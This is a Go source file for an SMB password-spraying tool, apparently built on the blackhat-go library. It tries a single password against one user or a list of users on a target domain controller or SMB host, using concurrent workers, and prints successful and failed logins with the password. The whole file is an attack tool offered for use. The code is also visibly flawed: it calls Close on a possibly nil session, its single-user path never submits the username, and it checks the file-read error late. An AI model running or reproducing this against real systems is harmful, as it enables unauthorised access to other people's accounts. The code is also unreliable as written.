package main

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/blackhat-go/bhg/ch-6/smb/smb"
	"log"
	"os"
)

type result struct {
	session *smb.Session
	err     error
}
type empty struct{}

func authenticate_smb(options smb.Options) []result {

	var results []result

	session, err := smb.NewSession(options, false)

	if err != nil {
		fmt.Printf("[-] Login Failed: %s\\%s [%s]\n",
			options.Domain,
			options.User,
			options.Password)
		session.Close()
		results = append(results, result{session: nil, err: err})
		return results
	}

	if session.IsAuthenticated {
		fmt.Printf("[+] Success: %s\\%s [%s]\n",
			options.Domain,
			options.User,
			options.Password)
	}
	results = append(results, result{session: session, err: nil})
	return results
}

func worker(tracker chan empty, usernames chan string, results chan []result, options smb.Options) {
	for user := range usernames {
		options.User = user
		res := authenticate_smb(options)
		results <- res
	}
	var e empty
	tracker <- e
}

func main() {
	var (
		password = flag.String("p", "", "The password for authentication")
		domain   = flag.String("d", "", "The domain to spray against")
		userFile = flag.String("uf", "", "The user file to spray passwords against")
		user     = flag.String("u", "", "The user you want to spray against")
		host     = flag.String("h", "", "The host that will perform authentication")
		threads  = flag.Int("t", 1, "number of threads to run, default is 1")
	)

	flag.Parse()

	if *domain == "" || *password == "" || (*user == "" && *userFile == "") || *host == "" {
		fmt.Printf("[+] Help Menu [+]\n")
		fmt.Printf("-u <username> The user you want to spray against\n")
		fmt.Printf("-d <domain> The domain to spray against\n")
		fmt.Printf("-h <host name> The host that will perform authenticaton (Target SMB Server)\n")
		fmt.Printf("-uf <user file path> The file that contains user names that the password will be checked against\n")
		fmt.Printf("-p <password> Password to be sprayed against users.\n")
		fmt.Printf("-t 10 number of threads to run, default is 1\n")
		return
	}

	var results []result
	usernames := make(chan string, *threads)
	ch_res := make(chan []result)
	tracker := make(chan empty)

	if *user != "" {
		options := smb.Options{
			Password: *password,
			Domain:   *domain,
			Host:     *host,
			Port:     445,
		}

		for i := 0; i < *threads; i++ {
			go worker(tracker, usernames, ch_res, options)
		}
		go func() {
			for r := range ch_res {
				results = append(results, r...)
			}
			var e empty
			tracker <- e
		}()

		return
	}

	if *userFile != "" {
		buf, err := os.ReadFile(*userFile)
		users := bytes.Split(buf, []byte{'\n'})

		if err != nil {
			log.Fatalln(err)
		}
		options := smb.Options{
			Password: *password,
			Domain:   *domain,
			Host:     *host,
			Port:     445,
		}

		for i := 0; i < *threads; i++ {
			go worker(tracker, usernames, ch_res, options)
		}
		for _, user := range users {
			usernames <- string(user)
		}

		go func() {
			for r := range ch_res {
				results = append(results, r...)
			}
			var e empty
			tracker <- e
		}()

		close(usernames)
		for i := 0; i < *threads; i++ {
			<-tracker
		}
		close(ch_res)
		//<-tracker
	}

}
